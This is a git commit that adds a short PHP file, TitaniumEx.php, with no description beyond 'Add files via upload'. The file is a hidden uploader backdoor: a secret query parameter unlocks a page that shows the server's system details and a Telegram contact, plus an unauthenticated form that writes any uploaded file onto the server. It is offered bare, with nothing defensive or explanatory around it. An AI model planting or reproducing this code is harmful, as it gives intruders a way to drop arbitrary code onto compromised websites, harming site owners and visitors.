127dbaf980c3dc68cc9b87cbf48ae3d17480a60e
f4ruk1453decodex <133605406+f4ruk1453decodex@users.noreply.github.com>
2023-05-15 00:02:00 +0300

    Add files via upload

---
+++ TitaniumEx.php
@@ -0,0 +1,5 @@
+<?php 
+if ($_GET['Titanium'] == 'Ex'){
+    echo '<pre><p>Telegram : @N0NL0C4L</p>'.php_uname()."\n".'<br/><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload"></form>';if($_POST){if(@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])){echo 'Uploaded';}else{echo 'Not Uploaded';}}
+}
+?>
